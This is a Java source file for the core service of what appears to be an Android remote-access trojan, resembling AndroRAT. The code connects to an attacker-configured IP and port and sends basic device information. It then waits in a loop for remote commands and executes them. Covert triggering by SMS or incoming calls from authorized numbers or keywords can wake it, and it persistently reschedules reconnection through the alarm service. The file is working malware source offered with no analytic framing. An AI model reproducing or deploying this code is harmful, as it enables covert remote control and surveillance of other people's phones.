package my.app.client;

import inout.Controler;
import inout.Protocol;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.StringTokenizer;
import java.util.prefs.Preferences;

import out.Connection;

import my.app.Library.CallMonitor;
import my.app.Library.SystemInfo;

import Packet.*;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Address;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.StrictMode;
import android.util.Log;
import android.widget.Toast;

public class Client extends ClientListener implements Controler {

	public final String TAG = Client.class.getSimpleName();
	Connection conn;

	int nbAttempts = 10;
	int elapsedTime = 1;

	boolean stop = false;

	boolean isRunning = false;
	boolean isListening = false;
	Thread readthread;
	ProcessCommand procCmd;
	byte[] cmd;
	CommandPacket packet;

	private Handler handler = new Handler() {

		public void handleMessage(Message msg) {
			Bundle b = msg.getData();
			processCommand(b);
		}
	};

	public void onCreate() {

		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
		StrictMode.setThreadPolicy(policy);
		Log.i(TAG, "In onCreate");
		infos = new SystemInfo(this);
		procCmd = new ProcessCommand(this);

		loadPreferences();
	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		if (intent == null)
			return START_STICKY;
		String who = intent.getAction();
		Log.i(TAG, "onStartCommand by: " + who);

		if (intent.hasExtra("IP"))
			this.ip = intent.getExtras().getString("IP");
		if (intent.hasExtra("PORT"))
			this.port = intent.getExtras().getInt("PORT");

		if (!isRunning) {
			IntentFilter filterc = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
			registerReceiver(ConnectivityCheckReceiver, filterc);
			isRunning = true;
			conn = new Connection(ip, port, this);

			if (waitTrigger) {
				registerSMSAndCall();
			} else {
				Log.i(TAG, "Try to connect to " + ip + ":" + port);
				if (conn.connect()) {
					packet = new CommandPacket();
					readthread = new Thread(new Runnable() {
						public void run() {
							waitInstruction();
						}
					});
					readthread.start();
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
					handleData(0, pack.build());
					isListening = true;
					if (waitTrigger) {
						unregisterReceiver(SMSreceiver);
						unregisterReceiver(Callreceiver);
						waitTrigger = false;
					}
				} else {
					if (isConnected) {
						resetConnectionAttempts();
						reconnectionAttempts();
					} else {
						Log.w(TAG, "Not Connected wait a Network update");
					}
				}
			}
		} else {
			if (isListening) {
				Log.w(TAG, "Called uselessly by: " + who + " (already listening)");
			} else {
				Log.i(TAG, "Connection by : " + who);
				if (conn.connect()) {
					readthread = new Thread(new Runnable() {
						public void run() {
							waitInstruction();
						}
					});
					readthread.start();
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
					handleData(0, pack.build());
					isListening = true;
					if (waitTrigger) {
						unregisterReceiver(SMSreceiver);
						unregisterReceiver(Callreceiver);
						waitTrigger = false;
					}
				} else {
					reconnectionAttempts();
				}
			}
		}

		return START_STICKY;
	}

	public void waitInstruction() {
		try {
			for (;;) {
				if (stop)
					break;
				conn.getInstruction();
			}
		} catch (Exception e) {
			isListening = false;
			resetConnectionAttempts();
			reconnectionAttempts();
			if (waitTrigger) {
				registerSMSAndCall();
			}
		}
	}

	public void processCommand(Bundle b) {
		try {
			procCmd.process(b.getShort("command"), b.getByteArray("arguments"), b.getInt("chan"));
		} catch (Exception e) {
			sendError("Error on Client:" + e.getMessage());
		}
	}

	public void reconnectionAttempts() {
		/*
		 * 10 volte ogni minuto 5 volte ogni 5 minuti 3 volte ogni 10 minuti 1
		 * volta dopo 30 minuti
		 */
		if (!isConnected)
			return;

		if (nbAttempts == 0) {
			switch (elapsedTime) {
			case 1:
				elapsedTime = 5;
				break;
			case 5:
				elapsedTime = 10;
				break;
			case 10:
				elapsedTime = 30;
				break;
			case 30:
				return;
			}
		}

		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, elapsedTime);

		Intent intent = new Intent(this, AlarmListener.class);

		intent.putExtra("alarm_message", "Wake up Dude !");

		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);

		// -----------------------
		nbAttempts--;
	}

	public void loadPreferences() {
		PreferencePacket p = procCmd.loadPreferences();
		waitTrigger = p.isWaitTrigger();
		ip = p.getIp();
		port = p.getPort();
		authorizedNumbersCall = p.getPhoneNumberCall();
		authorizedNumbersSMS = p.getPhoneNumberSMS();
		authorizedNumbersKeywords = p.getKeywordSMS();
	}

	public void sendInformation(String infos) {
		conn.sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 0, infos).build());
	}

	public void sendError(String error) {
		conn.sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 1, error).build());
	}

	public void handleData(int channel, byte[] data) {
		conn.sendData(channel, data);
	}

	public void onDestroy() {

		Log.i(TAG, "in onDestroy");
		unregisterReceiver(ConnectivityCheckReceiver);
		conn.stop();
		stop = true;
		stopSelf();
		super.onDestroy();
	}

	public void resetConnectionAttempts() {
		nbAttempts = 10;
		elapsedTime = 1;
	}

	public void registerSMSAndCall() {
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
		registerReceiver(SMSreceiver, filter);
		IntentFilter filter2 = new IntentFilter();
		filter2.addAction("android.intent.action.PHONE_STATE");
		registerReceiver(Callreceiver, filter2);
	}

	public void Storage(TransportPacket p, String i) {
		try {
			packet = new CommandPacket();
			packet.parse(p.getData());

			Message mess = new Message();
			Bundle b = new Bundle();
			b.putShort("command", packet.getCommand());
			b.putByteArray("arguments", packet.getArguments());
			b.putInt("chan", packet.getTargetChannel());
			mess.setData(b);
			handler.sendMessage(mess);
		} catch (Exception e) {

		}
	}
}
